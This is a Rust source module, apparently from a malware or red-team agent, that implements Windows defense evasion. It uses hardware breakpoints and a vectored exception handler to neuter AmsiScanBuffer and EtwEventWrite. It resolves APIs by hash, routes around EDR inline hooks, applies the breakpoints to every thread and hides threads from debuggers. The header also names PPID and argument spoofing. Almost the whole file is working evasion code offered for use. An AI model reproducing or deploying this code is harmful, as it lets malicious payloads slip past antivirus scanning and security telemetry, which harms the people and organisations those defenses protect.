//! Evasion mechanisms including HWBP-based AMSI/ETW bypass, PPID spoofing, argument spoofing, and callback execution.
//!
//! # Operation
//! - HWBP AMSI/ETW Bypass: Uses thread context hardware debug registers (Dr0-Dr3) to intercept execution at AMSI/ETW boundaries.
//! - PPID Spoofing: Manipulates thread attributes during process creation to masquerade the parent process.
//! - Argument Spoofing: Modifies the PEB command line at runtime.
//!
//! # Required Privileges
//! Standard user privileges are generally sufficient, though certain target processes for PPID spoofing may require SeDebugPrivilege.
//!
//! # Compatibility
//! Windows 10+ only (relies on specific offsets and newer thread context manipulation APIs).

#[cfg(windows)]
use std::sync::atomic::{AtomicUsize, Ordering};

#[cfg(windows)]
static AMSI_ADDR: AtomicUsize = AtomicUsize::new(0);
#[cfg(windows)]
static ETW_ADDR: AtomicUsize = AtomicUsize::new(0);

#[cfg(windows)]
unsafe extern "system" fn veh_handler(
    exception_info: *mut winapi::um::winnt::EXCEPTION_POINTERS,
) -> i32 {
    let record = (*exception_info).ExceptionRecord;
    let context = (*exception_info).ContextRecord;

    if (*record).ExceptionCode == winapi::um::winnt::STATUS_SINGLE_STEP {
        let rip = (*context).Rip as usize;
        let amsi = AMSI_ADDR.load(Ordering::Relaxed);
        let etw = ETW_ADDR.load(Ordering::Relaxed);

        if (amsi != 0 && rip == amsi) || (etw != 0 && rip == etw) {
            // Bypass by clearing RAX (returning 0) and advancing RIP to a ret instruction
            (*context).Rax = 0;

            // Use NtClose as a known, small syscall stub to safely find a 'ret' (0xC3)
            // gadget without hitting false positives in complex instructions.
            let mut ptr = rip as *const u8; // Fallback to current rip if resolving fails
            let ntdll: *mut winapi::ctypes::c_void =
                pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0) as _;
            if !ntdll.is_null() {
                let nt_close: *mut winapi::ctypes::c_void =
                    pe_resolve::get_proc_address_by_hash(ntdll as usize, pe_resolve::HASH_NTCLOSE)
                        .unwrap_or(0) as _;
                if !nt_close.is_null() {
                    let p = nt_close as *const u8;
                    // 0xE9 = near relative jmp (5 bytes): typical inline hook.
                    // 0xFF 0x25 = indirect jmp via RIP-relative pointer (6 bytes):
                    // common in 64-bit EDR hooks that redirect via a trampoline table.
                    if *p == 0xFF && *p.add(1) == 0x25 {
                        // Read the 4-byte signed RIP-relative displacement.
                        let disp = std::ptr::read_unaligned(p.add(2) as *const i32);
                        // Slot address = end of instruction (p+6) + disp.
                        let slot = (p as usize).wrapping_add(6).wrapping_add(disp as isize as usize);
                        // Dereference the slot to get the real target address.
                        let target = std::ptr::read_unaligned(slot as *const usize);
                        if target != 0 {
                            ptr = target as *const u8;
                        }
                    } else if *p != 0xE9 {
                        // Not a near-jmp hook: safe to use as ret-gadget source.
                        ptr = p;
                    }
                }
            }

            for _ in 0..32 {
                if *ptr == 0xC3 || *ptr == 0xC2 {
                    break;
                }
                ptr = ptr.add(1);
            }
            // Fallback: if no ret gadget found in the search window, do NOT
            // redirect RIP to an arbitrary address (which would crash).
            // Let the exception propagate to the next handler in the VEH chain (C-4).
            if *ptr != 0xC3 && *ptr != 0xC2 {
                return winapi::vc::excpt::EXCEPTION_CONTINUE_SEARCH;
            }

            // M-30: Verify the ret gadget doesn't straddle a page boundary.
            // 0xC3 (ret) is 1 byte — always safe.  0xC2 xx xx (ret N) is 3 bytes —
            // must check for page boundary crossing.
            // Note: We use a page-alignment check only (not VirtualQuery) here
            // because VirtualQuery can deadlock when called from a VEH handler
            // that was triggered by a memory operation.
            let gadget_addr = ptr as usize;
            let gadget_len = if *ptr == 0xC3 { 1usize } else { 3usize }; // 0xC2 = ret N = 3 bytes
            if gadget_len > 1 {
                let page_start = gadget_addr & !0xFFF;
                let page_end = page_start + 0x1000;
                if gadget_addr + gadget_len > page_end {
                    // Gadget straddles a page boundary — unsafe to execute.
                    return winapi::vc::excpt::EXCEPTION_CONTINUE_SEARCH;
                }
            }

            // Stack corruption mitigation: redirect RIP to the ret gadget.
            // For a bare `ret` (0xC3) the CPU will pop [Rsp] into Rip and
            // add 8, which is safe provided the HWBP fires at the function
            // entry before any prologue has shifted Rsp.  For `ret N` (0xC2)
            // the CPU additionally adds N to Rsp after the pop, cleaning up
            // the stack arguments — this is generally the safer variant.
            // In both cases we set Rip to the gadget and let the CPU handle
            // the stack adjustment; we do NOT manually touch Rsp here to
            // avoid double-adjusting it.
            (*context).Rip = ptr as u64;

            return winapi::vc::excpt::EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    winapi::vc::excpt::EXCEPTION_CONTINUE_SEARCH
}

#[cfg(windows)]
pub unsafe fn setup_hardware_breakpoints() {
    use winapi::um::errhandlingapi::AddVectoredExceptionHandler;
    use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
    use winapi::um::processthreadsapi::{
        GetCurrentProcessId, GetThreadContext, OpenThread, ResumeThread, SetThreadContext,
        SuspendThread,
    };
    use winapi::um::tlhelp32::{
        CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32,
    };
    use winapi::um::winnt::{CONTEXT, CONTEXT_DEBUG_REGISTERS, THREAD_ALL_ACCESS};

    type NtGetContextThreadFn =
        unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;
    type NtSetContextThreadFn =
        unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;

    let mut nt_get_context_thread: Option<NtGetContextThreadFn> = None;
    let mut nt_set_context_thread: Option<NtSetContextThreadFn> = None;

    let mut configured = false;

    let amsi: *mut winapi::ctypes::c_void =
        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_AMSI_DLL).unwrap_or(0) as *mut _;
    if !amsi.is_null() {
        let addr: *mut winapi::ctypes::c_void =
            pe_resolve::get_proc_address_by_hash(amsi as usize, pe_resolve::HASH_AMSISCANBUFFER)
                .unwrap_or(0) as *mut _;
        if !addr.is_null() {
            AMSI_ADDR.store(addr as usize, Ordering::Relaxed);
            configured = true;
        }
    }

    let ntdll: *mut winapi::ctypes::c_void =
        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0) as *mut _;
    if !ntdll.is_null() {
        let addr: *mut winapi::ctypes::c_void =
            pe_resolve::get_proc_address_by_hash(ntdll as usize, pe_resolve::HASH_ETWEVENTWRITE)
                .unwrap_or(0) as *mut _;
        if !addr.is_null() {
            ETW_ADDR.store(addr as usize, Ordering::Relaxed);
            configured = true;
        }

        let nt_get_hash = pe_resolve::hash_str(b"NtGetContextThread\0");
        let nt_set_hash = pe_resolve::hash_str(b"NtSetContextThread\0");

        let nt_get_addr: *mut winapi::ctypes::c_void =
            pe_resolve::get_proc_address_by_hash(ntdll as usize, nt_get_hash).unwrap_or(0) as _;
        if !nt_get_addr.is_null() {
            nt_get_context_thread = Some(std::mem::transmute(nt_get_addr));
        }

        let nt_set_addr: *mut winapi::ctypes::c_void =
            pe_resolve::get_proc_address_by_hash(ntdll as usize, nt_set_hash).unwrap_or(0) as _;
        if !nt_set_addr.is_null() {
            nt_set_context_thread = Some(std::mem::transmute(nt_set_addr));
        }
    }

    if nt_set_context_thread.is_some() {
        log::debug!("evasion: using NtSetContextThread for debug register modification");
    } else {
        log::debug!("evasion: NtSetContextThread not available, falling back to SetThreadContext");
        log::warn!(
            "evasion: SetThreadContext fallback path in use for debug register modification"
        );
    }

    if !configured {
        return;
    }

    // Register our VEH first; store the handle so it can be removed later
    // via RemoveVectoredExceptionHandler if needed (M-25 fix).
    static VEH_HANDLE: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let veh = AddVectoredExceptionHandler(1, Some(veh_handler));
    if !veh.is_null() {
        VEH_HANDLE.get_or_init(|| veh as usize);
    }

    // Propagate hardware breakpoints to all existing threads in the process
    let pid = GetCurrentProcessId();
    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if snapshot != INVALID_HANDLE_VALUE {
        let mut te32: THREADENTRY32 = std::mem::zeroed();
        te32.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;

        if Thread32First(snapshot, &mut te32) != 0 {
            loop {
                if te32.th32OwnerProcessID == pid {
                    let h_thread = OpenThread(THREAD_ALL_ACCESS, 0, te32.th32ThreadID);
                    if !h_thread.is_null() {
                        SuspendThread(h_thread);

                        let mut ctx: CONTEXT = std::mem::zeroed();
                        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
                        let got_context = if let Some(nt_get_ctx) = nt_get_context_thread {
                            let status = nt_get_ctx(h_thread, &mut ctx);
                            if status >= 0 {
                                true
                            } else {
                                log::warn!(
                                    "evasion: NtGetContextThread failed for tid {} (status=0x{:08x}), falling back to GetThreadContext",
                                    te32.th32ThreadID,
                                    status as u32
                                );
                                GetThreadContext(h_thread, &mut ctx) != 0
                            }
                        } else {
                            GetThreadContext(h_thread, &mut ctx) != 0
                        };

                        if got_context {
                            ctx.Dr0 = AMSI_ADDR.load(Ordering::Relaxed) as u64;
                            ctx.Dr1 = ETW_ADDR.load(Ordering::Relaxed) as u64;
                            // Enable local breakpoints for Dr0 (bit 0) and Dr1 (bit 2)
                            ctx.Dr7 |= (1 << 0) | (1 << 2);

                            if let Some(nt_set_ctx) = nt_set_context_thread {
                                let status = nt_set_ctx(h_thread, &mut ctx);
                                if status < 0 {
                                    log::warn!(
                                        "evasion: NtSetContextThread failed for tid {} (status=0x{:08x}), falling back to SetThreadContext",
                                        te32.th32ThreadID,
                                        status as u32
                                    );
                                    SetThreadContext(h_thread, &ctx);
                                }
                            } else {
                                SetThreadContext(h_thread, &ctx);
                            }
                        }

                        ResumeThread(h_thread);
                        CloseHandle(h_thread);
                    }
                }
                if Thread32Next(snapshot, &mut te32) == 0 {
                    break;
                }
            }
        }
        CloseHandle(snapshot);
    }
}

// Backward compatibility for existing patch functions in lib.rs
#[cfg(windows)]
pub unsafe fn patch_amsi() {
    setup_hardware_breakpoints();
}

#[cfg(not(windows))]
/// # Safety
///
/// No-op stub on non-Windows; always safe to call.
pub unsafe fn patch_amsi() {}

/// Apply the ETW bypass using the method configured in the agent config.
///
/// Defaults to [`common::config::EtwPatchMethod::Direct`] when `method` is
/// `None`, which overwrites the ETW function entry points with `ret` (0xC3).
/// When `Hwbp` is selected the existing hardware-breakpoint VEH approach is
/// used instead.  Both approaches may be layered: if direct patching fails
/// (e.g. `VirtualProtect` is blocked by CFG), the caller should fall back to
/// `setup_hardware_breakpoints()` independently.
///
/// # Safety
///
/// Modifies process state; see [`crate::etw_patch::patch_etw`] and
/// [`setup_hardware_breakpoints`] for their respective safety requirements.
pub unsafe fn setup_etw_patch(method: Option<&common::config::EtwPatchMethod>) {
    use common::config::EtwPatchMethod;
    match method.unwrap_or(&EtwPatchMethod::Direct) {
        EtwPatchMethod::Direct => crate::etw_patch::patch_etw(),
        EtwPatchMethod::Hwbp => {
            #[cfg(windows)]
            setup_hardware_breakpoints();
        }
    }
}

#[cfg(windows)]
pub fn hide_current_thread() {
    unsafe {
        let ntdll: *mut winapi::ctypes::c_void =
            pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0) as _;
        if !ntdll.is_null() {
            let func: *mut winapi::ctypes::c_void = pe_resolve::get_proc_address_by_hash(
                ntdll as usize,
                pe_resolve::HASH_NTSETINFORMATIONTHREAD,
            )
            .unwrap_or(0) as _;
            if !func.is_null() {
                let nt_set_info_thread: extern "system" fn(
                    winapi::um::winnt::HANDLE,
                    u32,
                    *mut winapi::ctypes::c_void,
                    u32,
                ) -> i32 = std::mem::transmute(func);
                nt_set_info_thread(
                    -2isize as winapi::um::winnt::HANDLE, // GetCurrentThread()
                    0x11,                                 // ThreadHideFromDebugger
                    std::ptr::null_mut(),
                    0,
                );
            }
        }
    }
}

#[cfg(not(windows))]
pub fn hide_current_thread() {}

/// Apply hardware breakpoints for AMSI/ETW bypass to the *calling* thread.
/// Called automatically by [`spawn_hidden_thread`]; call this at the start of
/// any other thread that must also be covered by the HWBP bypass.
#[cfg(windows)]
pub unsafe fn apply_hwbp_to_current_thread() {
    use winapi::um::processthreadsapi::{GetCurrentThread, GetThreadContext, SetThreadContext};
    use winapi::um::winnt::{CONTEXT, CONTEXT_DEBUG_REGISTERS};

    let amsi = AMSI_ADDR.load(Ordering::Relaxed);
    let etw = ETW_ADDR.load(Ordering::Relaxed);
    if amsi == 0 && etw == 0 {
        return; // HWBPs not yet configured; skip silently
    }

    let mut ctx: CONTEXT = std::mem::zeroed();
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    let h = GetCurrentThread();
    if GetThreadContext(h, &mut ctx) != 0 {
        ctx.Dr0 = amsi as u64;
        ctx.Dr1 = etw as u64;
        ctx.Dr7 |= (1 << 0) | (1 << 2); // enable local breakpoints for Dr0 and Dr1
        SetThreadContext(h, &ctx);
    }
}

pub fn spawn_hidden_thread<F, T>(f: F) -> std::thread::JoinHandle<T>
where
    F: FnOnce() -> T + Send + 'static,
    T: Send + 'static,
{
    std::thread::spawn(move || {
        #[cfg(windows)]
        unsafe {
            apply_hwbp_to_current_thread();
        }
        hide_current_thread();
        f()
    })
}
